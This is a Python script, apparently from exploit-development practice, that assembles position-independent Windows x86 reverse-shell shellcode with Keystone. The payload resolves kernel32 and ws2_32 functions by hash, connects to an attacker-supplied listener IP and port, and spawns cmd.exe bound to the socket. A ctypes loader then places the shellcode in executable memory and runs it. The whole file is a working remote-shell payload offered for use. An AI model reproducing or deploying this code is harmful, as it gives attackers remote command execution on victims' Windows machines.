""" 
Reverse Shell shellcode
Remove int3 command in start:
Change IP Address in wsa_connect:
Change Port in wsa_connect:
"""

import sys
import ctypes
import keystone

from struct import pack

"""
Find base address of kernel32.dll (Using the PEB method)
Resolve kernel32.dll's exported functions (LoadLibraryA and GetProcAddress)

"""


def create_assembly(ip, port):

    hex_ip      = to_hex(ip)
    hex_port    = to_hex(port)

    print(f"[*] Hex IP = {hex_ip} and hex port = {hex_port}")

    code = (
        " start:                            "
        # "   int3;                           "  # Set bp in Windbg. REMOVE WHEN NOT DEBUGGING!
        "   mov   ebp, esp;                 "  # Simulate start of function call (set new base as current top of stack)
        "   add   esp, 0xfffff9f0;          "  # Decrement esp to provide space for the frame (avoid NULL bytes)

        " find_kernel32:                    "  # Store base address of kernel32 in EBX
        "   xor   ecx, ecx;                 "  # ECX = 0
        "   mov   esi,fs:[ecx+0x30];        "  # ESI = &(PEB)
        "   mov   esi,[esi+0x0C];           "  # ESI = PEB->Ldr
        "   mov   esi,[esi+0x1C];           "  # ESI = PEB->Ldr.InInitializationOrder

        " next_module:                      "  # Loop through modules until 'kernel32.dll'
        "   mov   ebx, [esi+0x8];           "  # EBX = InInitializationOrder[i].base_address
        "   mov   edi, [esi+0x20];          "  # EDI = InInitializationOrder[i].module_name
        "   mov   esi, [esi];               "  # ESI = InInitializationOrder[i].flink (next)

        "   cmp   [edi+12*2], cx;           "  # Check null byte terminator (cx = 0x00)
        "   jne   next_module;              "  # No: try next module.

        "   mov   eax, 0x11111111;          "
        "   sub   eax, 0x10cc10c6;          "  # EAX = 'KE'
        "   cmp   [edi], eax;               "  # Compare EAX with first 2 chars of module_name
        "   jne   next_module;              "  # No: try next module.

        "   mov   eax, 0x11111111;          "
        "   sub   eax, 0x10c310bf;          "  # EAX = 'RN'
        "   cmp   [edi+2*2], eax;           "  # Compare EAX with next 2 chars of module_name
        "   jne   next_module;              "  # No: try next module.

        "   mov   eax, 0x11111111;          "
        "   sub   eax, 0x10c510cc;          "  # EAX = 'EL'
        "   cmp   [edi+4*2], eax;           "  # Compare EAX with next 2 chars of module_name
        "   jne   next_module;              "  # No: try next module.

        "   mov   eax, 0x11111111;          "
        "   sub   eax, 0x10df10de;          "  # EAX = '32'
        "   cmp   [edi+6*2], eax;           "  # Compare EAX with next 2 chars of module_name
        "   jne   next_module;              "  # No: try next module.

        "   mov   eax, 0x11111111;          "
        "   sub   eax, 0x10cd10e3;          "  # EAX = '.D'
        "   cmp   [edi+8*2], eax;           "  # Compare EAX with next 2 chars of module_name
        "   jne   next_module;              "  # No: try next module.

        "   mov   eax, 0x11111111;          "
        "   sub   eax, 0x10c510c5;          "  # EAX = 'LL'
        "   cmp   [edi+10*2], eax;          "  # Compare EAX with next 2 chars of module_name
        "   jne   next_module;              "  # No: try next module.

        " find_function_shorten:            "  #
        "   jmp   find_function_shorten_bnc;"  #

        " find_function_ret:                "  #
        "   pop   esi;                      "  # POP the return address from the stack
        "   mov   [ebp+0x04], esi;          "  # Save find_function address for later usage
        "   jmp   resolve_symbols_kernel32; "  #

        " find_function_shorten_bnc:        "  #
        "   call  find_function_ret;        "  # Relative CALL with negative offset, pushes next instruction address

        " find_function:                    "  # Set EAX to VMA of function (takes function name hash as arg)
        # Save all registers (Base addrerss of kernel32 is in EBP from previous step)
        "   pushad;                         "
        "   mov   eax, [ebx+0x3c];          "  # EAX = Offset to PE Signature (from base address of DLL)
        "   mov   edi, [ebx+eax+0x78];      "  # EDI = Export Table Directory Relative Virtual Address
        "   add   edi, ebx;                 "  # EDI = Export Table Directory Virtual Memory Address
        "   mov   ecx, [edi+0x18];          "  # ECX = NumberOfNames
        "   mov   eax, [edi+0x20];          "  # EAX = AddressOfNames RVA
        "   add   eax, ebx;                 "  # EAX = AddressOfNames VMA
        "   mov   [ebp-4], eax;             "  # Save AddressOfNames VMA for later

        " find_function_loop:               "  # Set ESI to address of function name
        # Jump to end if ECX is 0 (reached end of array without finding symbol name)
        "   jecxz find_function_finished;   "
        "   dec   ecx;                      "  # ECX -= 1 (NumberOfNames)
        "   mov   eax, [ebp-4];             "  # EAX = AddressOfNames VMA
        "   mov   esi, [eax+ecx*4];         "  # ESI = current symbol name RVA
        "   add   esi, ebx;                 "  # ESI = current symbol name VMA

        " compute_hash:                     "  # Store hash of funcion name in EDX
        "   xor   eax, eax;                 "  # NULL EAX
        "   cdq;                            "  # NULL EDX
        "   cld;                            "  # From now on, string operations increment esi and edi

        " compute_hash_again:               "  #
        "   lodsb;                          "  # Load the next byte from esi into al (string op)
        "   test  al, al;                   "  # Check for NULL terminator
        "   jz    compute_hash_finished;    "  # If the ZF is set, we've hit the NULL term
        "   ror   edx, 0x0d;                "  # Rotate edx 13 bits to the right
        "   add   edx, eax;                 "  # Add the new byte to the accumulator
        "   jmp   compute_hash_again;       "  # Next iteration

        " compute_hash_finished:            "  #

        " find_function_compare:            "  #
        "   cmp   edx, [esp+0x24];          "  # Compare the computed hash with the requested hash
        "   jnz   find_function_loop;       "  # If it doesn't match, go back to find_function_loop
        "   mov   edx, [edi+0x24];          "  # EDX = AddressOfNameOrdinals RVA
        "   add   edx, ebx;                 "  # EDX = AddressOfNameOrdinals VMA
        "   mov   cx,  [edx+2*ecx];         "  # CX = Extrapolate the function's ordinal
        "   mov   edx, [edi+0x1c];          "  # EDX = AddressOfFunctions RVA
        "   add   edx, ebx;                 "  # EDX = AddressOfFunctions VMA
        "   mov   eax, [edx+4*ecx];         "  # EAX = Function RVA
        "   add   eax, ebx;                 "  # EAX = Function VMA
        "   mov   [esp+0x1c], eax;          "  # Overwrite stack version of eax from pushad

        " find_function_finished:           "  #
        "   popad;                          "  # Restore registers
        "   ret;                            "  #

        " resolve_symbols_kernel32:         "  # Save addresses of various functions to call later
        "   push  0x78b5b983;               "  # TerminateProcess hash
        "   call  dword ptr [ebp+0x04];     "  # Call find_function; EAX = TerminateProcess VMA
        "   mov   [ebp+0x10], eax;          "  # Save TerminateProcess address on stack
        "   push  0xec0e4e8e;               "  # LoadLibraryA hash
        "   call  dword ptr [ebp+0x04];     "  # Call find_function; EAX = LoadLibraryA VMA
        "   mov   [ebp+0x14], eax;          "  # Save LoadLibraryA address
        "   push  0x16b3fe72;               "  # CreateProcessA hash
        "   call  dword ptr [ebp+0x04];     "  # Call find_function; EAX = CreateProcessA VMA
        "   mov   [ebp+0x18], eax;          "  # Save CreateProcessA address

        " load_ws2_32:                      "  #
        "   xor   eax, eax;                 "  # Null EAX
        "   mov   ax, 0x6c6c;               "  # Move the end of the string in AX
        "   push  eax;                      "  # Push EAX on the stack with string NULL terminator
        "   push  0x642e3233;               "  # Push part of the string on the stack
        "   push  0x5f327377;               "  # Push another part of the string on the stack
        "   push  esp;                      "  # Push ESP to have a pointer to the string
        "   call dword ptr [ebp+0x14];      "  # Call LoadLibraryA

        " resolve_symbols_ws2_32:           "
        "   mov   ebx, eax;                 "  # Move the base address of ws2_32.dll to EBX
        "   push  0x3bfcedcb;               "  # WSAStartup hash
        "   call dword ptr [ebp+0x04];      "  # Call find_function; EAX = WSAStartup VMA
        "   mov   [ebp+0x1C], eax;          "  # Save WSAStartup address
        "   push  0xadf509d9;               "  # WSASocketA hash
        "   call dword ptr [ebp+0x04];      "  # Call find_function
        "   mov   [ebp+0x20], eax;          "  # Save WSASocketA address for later usage
        "   push  0xb32dba0c;               "  # WSAConnect hash
        "   call dword ptr [ebp+0x04];      "  # Call find_function
        "   mov   [ebp+0x24], eax;          "  # Save WSAConnect address for later usage

        " call_wsastartup:                  "  #
        "   mov   eax, esp;                 "  # Move ESP to EAX
        "   mov   cx, 0x590;                "  # Move 0x590 to CX
        "   sub   eax, ecx;                 "  # Subtract CX from EAX to avoid overwriting the structure later
        "   push  eax;                      "  # Push lpWSAData
        "   xor   eax, eax;                 "  # Null EAX
        "   mov   ax, 0x202;                "  # Move version to AX
        "   push  eax;                      "  # Push wVersionRequired
        "   call dword ptr [ebp+0x1C];      "  # Call WSAStartup

        " call_wsasocketa:                  "  # Open socket and set EAX to socket descriptor
        "   xor   eax, eax;                 "  # EAX = NULL
        "   push  eax;                      "  # dwFlags = NULL
        "   push  eax;                      "  # g = NULL
        "   push  eax;                      "  # lpProtocolInfo = NULl
        "   mov   al, 0x06;                 "  # Move AL, IPPROTO_TCP
        "   push  eax;                      "  # protocol = IPPROTO_TCP
        "   sub   al, 0x05;                 "  # EAX = AL = 0x01
        "   push  eax;                      "  # type = 0x01
        "   inc   eax;                      "  # EAX = 0x02
        "   push  eax;                      "  # af = 0x02
        "   call dword ptr [ebp+0x20];      "  # Call WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,null,null,null)

        " call_wsaconnect:                  "  #
        "   mov   esi, eax;                 "  # Move the SOCKET descriptor to ESI
        "   xor   eax, eax;                 "  # Null EAX
        "   push  eax;                      "  # sin_zero[] = NULL
        "   push  eax;                      "  # sin_zero[] = NULL
        f"   push  {hex_ip};                "  # sin_addr = Listener IP address
        f"   mov   ax, {hex_port};          "  # AX = Listener Port
        "   shl   eax, 0x10;                "  # EAX = Listener Port
        "   add   ax, 0x02;                 "  # Add 0x02 (AF_INET) to AX
        "   push  eax;                      "  # sin_port = Listener Port & sin_family = 2 (AF_INET)
        "   push  esp;                      "  # Push pointer to the sockaddr_in structure
        "   pop   edi;                      "  # Store pointer to sockaddr_in in EDI
        "   xor   eax, eax;                 "  # EAX = NULL
        "   push  eax;                      "  # lpGQOS = NULl
        "   push  eax;                      "  # lpSQOS = NULL
        "   push  eax;                      "  # lpCalleeData = NULL
        "   push  eax;                      "  # lpCallerData = NULL
        "   add   al, 0x10;                 "  # Set AL to 0x10
        "   push  eax;                      "  # namelen = 16 bytes
        "   push  edi;                      "  # name = pointer to sockaddr_in struct
        "   push  esi;                      "  # s = socket descriptor
        "   call dword ptr [ebp+0x24];      "  # Call WSAConnect(socket, &sockaddr_in, sizeof(sockaddr_in), )

        " create_startupinfoa:              "  #
        "   push  esi;                      "  # hStdError = sock_fd
        "   push  esi;                      "  # hStdOutput = sock_fd
        "   push  esi;                      "  # hStdInput = sock_fd
        "   xor   eax, eax;                 "  # Null EAX
        "   push  eax;                      "  # lpReserved2 = NULL
        "   push  eax;                      "  # cbReserved2 & wShowWindow = NULL
        "   mov   al, 0x80;                 "  # EAX = 0x80
        "   add   eax, 0x80;                "  # EAX = 0x100
        "   push  eax;                      "  # dwFlags = 0x100
        "   xor   eax, eax;                 "  # Null EAX
        "   push  eax;                      "  # dwFillAttribute = NULL
        "   push  eax;                      "  # dwYCountChars = NULL
        "   push  eax;                      "  # dwXCountChars = NULL
        "   push  eax;                      "  # dwYSize = NULL
        "   push  eax;                      "  # dwXSize = NULL
        "   push  eax;                      "  # dwY = NULL
        "   push  eax;                      "  # dwX = NULL
        "   push  eax;                      "  # lpTitle = NULL
        "   push  eax;                      "  # lpDesktop = NULL
        "   push  eax;                      "  # lpReserved = NULL
        "   mov   al, 0x44;                 "  # EAX = 0x44
        "   push  eax;                      "  # cb = 0x44 (struct size)
        "   push  esp;                      "  # Push pointer to the STARTUPINFOA structure
        "   pop   edi;                      "  # Store pointer to STARTUPINFOA in EDI

        " create_cmd_string:                "  #
        "   mov   eax, 0xff9a879b;          "  # EAX = -00657865
        "   neg   eax;                      "  # EAX = 00657865 ('exe')
        "   push  eax;                      "  # Push 'exe' to stack
        "   push  0x2e646d63;               "  # Push 'cmd.' to stack
        "   push  esp;                      "  # Push pointer to the "cmd.exe" string
        "   pop   ebx;                      "  # Store pointer to the "cmd.exe" string in EBX

        " call_createprocessa:              "  #
        "   mov   eax, esp;                 "  # Move ESP to EAX
        "   xor   ecx, ecx;                 "  # Null ECX
        "   mov   cx, 0x390;                "  # Move 0x390 to CX
        "   sub   eax, ecx;                 "  # Subtract CX from EAX to avoid overwriting the structure later
        "   push  eax;                      "  # Push lpProcessInformation
        "   push  edi;                      "  # lpStartupInfo = struct we made earlier
        "   xor   eax, eax;                 "  # Null EAX
        "   push  eax;                      "  # lpCurrentDirectory = NULL
        "   push  eax;                      "  # lpEnvironment = NULL
        "   push  eax;                      "  # dwCreationFlags = NULL
        "   inc   eax;                      "  # EAX = 0x01 (TRUE)
        "   push  eax;                      "  # bInheritHandles = TRUE
        "   dec   eax;                      "  # Null EAX
        "   push  eax;                      "  # lpThreadAttributes = NULL
        "   push  eax;                      "  # lpProcessAttributes = NULL
        "   push  ebx;                      "  # Push lpCommandLine = 'cmd.exe'
        "   push  eax;                      "  # Push lpApplicationName = NULL
        "   call dword ptr [ebp+0x18];      "  # Call CreateProcessA

        " exec_shellcode:                   "  #
        "   xor   ecx, ecx;                 "  # Null ECX
        "   push  ecx;                      "  # uExitCode
        "   push  0xffffffff;               "  # hProcess
        "   call  dword ptr [ebp+0x10];     "  # Call TerminateProcess
    )

    return code


def to_hex(input):
    if '.' in input:
        return '0x' + ''.join(reversed([format(int(octet), '02x') for octet in input.split('.')]))
    else:
        port = int(input)
        return '0x' + format(port, '04x')[2:] + format(port, '04x')[:2]


def main():

    ip = sys.argv[1]
    port = sys.argv[2]
    print(f"[+] Listener IP = {ip}")
    print(f"[+] Listener port = {port}")

    # Initialize engine in X86-32bit mode
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)

    code = create_assembly(ip, port)

    # Create shellcode from assembly
    encoding, count = ks.asm(code)
    print(f"[*] Encoded {count} instructions")

    # Format shellcode
    sh = b""
    for e in encoding:
        sh += pack("B", e)
    shellcode = bytearray(sh)

    print(f"[+] Shellcode is {len(shellcode)} bytes")

    formatted_output = "".join(f"\\x{byte:02x}" for byte in shellcode)
    print(f'[*] Generated shellcode = "{formatted_output}"')

    runningOnWindows = input(f"[+] Are you running on Windows [y/N]? ").lower() in [
        "y",
        "yes",
    ]
    if not runningOnWindows:
        print(f"[-] Run on Windows to continue!")
        exit()

    # Allocate virtual memory to store shellcode
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40),
    )

    if not ptr:
        print(f"[-] Could not allocate virtual memory!")
        raise ctypes.WinError()

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # Copy shellcode to allocation address
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))
    )

    print(f"[+] Shellcode located at address {hex(ptr)}")
    input(f"[?] Press Enter to execute shellcode...")

    hThread = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)),
    )

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(hThread), ctypes.c_int(-1))


if __name__ == "__main__":
    main()
